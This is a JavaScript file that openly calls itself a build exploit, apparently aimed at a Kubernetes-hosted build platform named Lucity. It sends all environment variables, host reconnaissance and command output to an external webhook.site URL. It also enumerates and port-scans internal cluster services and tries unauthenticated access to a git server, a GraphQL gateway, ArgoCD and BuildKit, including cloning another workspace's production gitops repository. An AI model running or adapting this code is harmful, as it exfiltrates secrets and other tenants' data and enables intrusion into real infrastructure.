const https = require('https');
const http = require('http');
const net = require('net');
const dns = require('dns');
const { execSync } = require('child_process');

const WEBHOOK = process.env.WEBHOOK_URL || "https://webhook.site/d16fa166-2948-4505-96c0-f67e0db0843d";

function post(label, data) {
  return new Promise((resolve) => {
    const u = new URL(WEBHOOK);
    const req = https.request({
      hostname: u.hostname, port: 443, path: u.pathname,
      method: 'POST', headers: { 'Content-Type': 'text/plain', 'X-Exfil': label },
      timeout: 10000
    }, (res) => { res.on('data', () => {}); res.on('end', resolve); });
    req.on('error', resolve);
    req.on('timeout', () => { req.destroy(); resolve(); });
    req.write(typeof data === 'string' ? data : JSON.stringify(data, null, 2));
    req.end();
  });
}

function httpGet(hostname, port, path) {
  return new Promise((resolve) => {
    const req = http.request({ hostname, port, path, method: 'GET', timeout: 5000 }, (res) => {
      let d = '';
      res.on('data', c => d += c);
      res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: d.substring(0, 5000) }));
    });
    req.on('error', e => resolve({ error: e.message }));
    req.on('timeout', () => { req.destroy(); resolve({ error: 'timeout' }); });
    req.end();
  });
}

function scanPort(host, port) {
  return new Promise((resolve) => {
    const sock = new net.Socket();
    sock.setTimeout(2000);
    sock.on('connect', () => { sock.destroy(); resolve(true); });
    sock.on('timeout', () => { sock.destroy(); resolve(false); });
    sock.on('error', () => resolve(false));
    sock.connect(port, host);
  });
}

function dnsLookup(name) {
  return new Promise((resolve) => {
    dns.resolve4(name, (err, addrs) => resolve(err ? null : addrs));
  });
}

async function main() {
  await post('start', `Build exploit started at ${new Date().toISOString()}`);

  // 1. Dump all env vars
  await post('env-vars', JSON.stringify(process.env, null, 2));

  // 2. Filesystem recon
  let fsRecon = '';
  try { fsRecon += 'id: ' + execSync('id').toString() + '\n'; } catch(e) {}
  try { fsRecon += 'hostname: ' + execSync('hostname').toString() + '\n'; } catch(e) {}
  try { fsRecon += 'resolv.conf:\n' + execSync('cat /etc/resolv.conf').toString() + '\n'; } catch(e) {}
  try { fsRecon += 'mounts:\n' + execSync('cat /proc/mounts').toString().substring(0, 3000) + '\n'; } catch(e) {}
  try { fsRecon += 'processes:\n' + execSync('ps aux 2>/dev/null || cat /proc/*/cmdline 2>/dev/null | tr "\\0" " " | head -50').toString() + '\n'; } catch(e) {}
  await post('fs-recon', fsRecon);

  // 3. DNS discovery - find ALL services
  const services = [
    'lucity-packager', 'lucity-gateway', 'lucity-builder', 'lucity-deployer',
    'lucity-webhook', 'lucity-cashier', 'lucity-dashboard',
    'lucity-infra-zot', 'lucity-infra-soft-serve', 'lucity-infra-argocd-server',
    'lucity-infra-argocd-repo-server', 'lucity-argocd-server',
    'lucity-buildkit', 'lucity-infra-argocd-redis'
  ];
  
  let dnsResults = '';
  for (const svc of services) {
    const fqdn = svc + '.lucity-system.svc.cluster.local';
    const addrs = await dnsLookup(fqdn);
    if (addrs) {
      dnsResults += `${fqdn} -> ${addrs.join(', ')}\n`;
      // Scan key ports
      for (const port of [80, 443, 8080, 9001, 9002, 9003, 9004, 9005, 5000, 23231, 23232, 50051, 6379, 1234]) {
        const open = await scanPort(addrs[0], port);
        if (open) dnsResults += `  OPEN ${addrs[0]}:${port}\n`;
      }
    }
  }
  await post('dns-scan', dnsResults || 'no services found');

  // 4. Try Soft-serve endpoints
  const ssAddrs = await dnsLookup('lucity-infra-soft-serve.lucity-system.svc.cluster.local');
  if (ssAddrs) {
    const ssIP = ssAddrs[0];
    // Try HTTP without auth
    const catalog = await httpGet(ssIP, 23232, '/');
    await post('softserve-root', JSON.stringify(catalog));
    
    // Try listing repos
    const repos = await httpGet(ssIP, 23232, '/repos');
    await post('softserve-repos', JSON.stringify(repos));
    
    // Try specific repo
    const zeitlos = await httpGet(ssIP, 23232, '/zeitlos-software-beast-gitops.git/info/refs?service=git-upload-pack');
    await post('softserve-zeitlos', JSON.stringify(zeitlos));
    
    // Try anonymous git clone
    try {
      const cloneResult = execSync('git clone http://' + ssIP + ':23232/zeitlos-software-beast-gitops.git /tmp/zeitlos-clone 2>&1', { timeout: 10000 }).toString();
      await post('softserve-clone', cloneResult);
      // If clone worked, read the repo
      try {
        const files = execSync('find /tmp/zeitlos-clone -type f | head -50').toString();
        await post('zeitlos-files', files);
        const values = execSync('cat /tmp/zeitlos-clone/environments/production/values.yaml 2>/dev/null || echo "no values"').toString();
        await post('zeitlos-values', values);
      } catch(e) { await post('zeitlos-read-err', e.message); }
    } catch(e) { await post('softserve-clone-err', e.stderr?.toString() || e.message); }
  }

  // 5. Try Packager gRPC (port 9002)
  const pkgAddrs = await dnsLookup('lucity-packager.lucity-system.svc.cluster.local');
  if (pkgAddrs) {
    await post('packager-ip', pkgAddrs.join(', '));
    // Try HTTP on various ports
    for (const port of [9002, 8080, 80]) {
      const res = await httpGet(pkgAddrs[0], port, '/');
      if (!res.error) await post(`packager-http-${port}`, JSON.stringify(res));
    }
  }

  // 6. Try Gateway (port 8080)  
  const gwAddrs = await dnsLookup('lucity-gateway.lucity-system.svc.cluster.local');
  if (gwAddrs) {
    // Hit the internal GraphQL endpoint without auth
    const gql = await new Promise((resolve) => {
      const req = http.request({
        hostname: gwAddrs[0], port: 8080, path: '/graphql',
        method: 'POST', headers: { 
          'Content-Type': 'application/json',
          'X-Lucity-Workspace': 'zeitlos-software'
        }, timeout: 5000
      }, (res) => {
        let d = '';
        res.on('data', c => d += c);
        res.on('end', () => resolve({ status: res.statusCode, body: d.substring(0, 2000) }));
      });
      req.on('error', e => resolve({ error: e.message }));
      req.on('timeout', () => { req.destroy(); resolve({ error: 'timeout' }); });
      req.write(JSON.stringify({ query: '{ projects { id name } }' }));
      req.end();
    });
    await post('gateway-internal', JSON.stringify(gql));
  }

  // 7. Try Deployer gRPC (port 9003)
  const depAddrs = await dnsLookup('lucity-deployer.lucity-system.svc.cluster.local');
  if (depAddrs) {
    await post('deployer-ip', depAddrs.join(', '));
    for (const port of [9003, 8080]) {
      const res = await httpGet(depAddrs[0], port, '/');
      if (!res.error) await post(`deployer-http-${port}`, JSON.stringify(res));
    }
  }

  // 8. Try ArgoCD
  const argoAddrs = await dnsLookup('lucity-infra-argocd-server.lucity-system.svc.cluster.local');
  if (argoAddrs) {
    const argoAPI = await httpGet(argoAddrs[0], 80, '/api/v1/applications');
    await post('argocd-apps', JSON.stringify(argoAPI));
    
    // Try listing all apps without auth
    const argoVersion = await httpGet(argoAddrs[0], 80, '/api/version');
    await post('argocd-version', JSON.stringify(argoVersion));
  }

  // 9. Try BuildKit
  const bkAddrs = await dnsLookup('lucity-buildkit.lucity-system.svc.cluster.local');
  if (bkAddrs) {
    await post('buildkit-ip', bkAddrs.join(', '));
    for (const port of [1234, 8080]) {
      const open = await scanPort(bkAddrs[0], port);
      if (open) await post(`buildkit-port-${port}`, 'OPEN');
    }
  }

  await post('done', 'Exploit complete');
  console.log('recon done');
}

main().catch(e => { console.error(e); post('fatal', e.message); });
